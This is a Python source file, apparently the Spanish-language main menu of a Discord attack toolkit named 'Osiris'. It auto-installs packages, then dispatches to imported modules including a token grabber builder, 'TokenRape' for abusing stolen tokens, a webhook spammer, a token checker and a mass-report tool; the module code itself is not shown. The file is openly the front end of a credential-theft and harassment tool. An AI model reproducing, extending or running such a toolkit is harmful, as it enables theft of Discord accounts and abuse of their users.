try:
    import os, sys
    from time import sleep
    from pystyle import Colorate, Colors
    from os import name, mkdir, system
    from os.path import isdir
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.bumper as bumper
    import modules.serverLookup as serverLookup
    import modules.commands as help
except ImportError as ex:
    
    def tortuga(_str):
        for letra in _str:
            sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
    
    def clear():
        os.system("cls" if os.name == 'nt' else "clear")
        print(f'\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.white} Instalando requisitos, espere')
        os.system("cls")
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando psutil... {Colors.white}")
    os.system("pip install psutil")
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pypiwin32... {Colors.white}")
    os.system("pip install pypiwin32")
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pillow... {Colors.white}")
    os.system("pip install pillow")
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando colorama... {Colors.white}")
    os.system('pip install colorama')
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando pystyle... {Colors.white}")
    os.system('pip install pystyle')
    tortuga(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} instalando requests... {Colors.white}")
    os.system('pip install requests')
    print(f'{Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.white} Requisitos instalados, reabriendo Osiris...')
    os.system('python osiris.py')
    sleep(2)
    exit()
    
def clear():
    system("cls" if name == 'nt' else "clear")
if name == 'nt':
        system("title Osiris")

class Client: 
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "8" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
            "9" : {"function" : massReport.start, "name" : "Mass Report"},
            "10" : {"function" : help.ayuda, "name" : "Ayuda"},
            "11" : {"function" : credits.show_credits, "name" : "Creditos"},
            "12" : {"function" : exit, "name" : "Salir"},
        }
        self.modules = modules
    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        opts = f"""
                            
               ██████╗ ███████╗██╗██████╗ ██╗███████╗
              ██╔═══██╗██╔════╝██║██╔══██╗██║██╔════╝
              ██║   ██║███████╗██║██████╔╝██║███████╗
              ██║   ██║╚════██║██║██╔══██╗██║╚════██║
              ╚██████╔╝███████║██║██║  ██║██║███████║
               ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒
                ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░  ░▒ ░ ▒░ ▒ ░░ ░▒
                ░ ░ ░ ▒  ░  ░  ░   ▒ ░  ░░   ░  ▒ ░░    
               ░   ░     ░      ░        ░  
                                       
                 {Colors.light_blue}[1] TokenRape            [7] TokenGrabber
                 {Colors.light_blue}[2] WebhookSpammer       [8] Server Lookup
                 {Colors.light_blue}[3] TokenChecker         [9] Mass Report
                 {Colors.light_blue}[4] WebhookChecker       [10] Ayuda
                 {Colors.light_blue}[5] HistoryClear         [11] Creditos
                 {Colors.light_blue}[6] AutoBump             [12] Salir
            """
              
        os.system(f'cls' if 'nt' else 'clear')
        print(Colorate.Vertical(Colors.purple_to_blue, (opts)))
        opcion = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}]Opcion: {Colors.white}")
        data = self.modules[opcion]
        data["function"]()
        input(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}] {Colors.white}Listo, presione enter para salir.")
        self.main()
if __name__ == '__main__':
    client = Client()
    client.main()
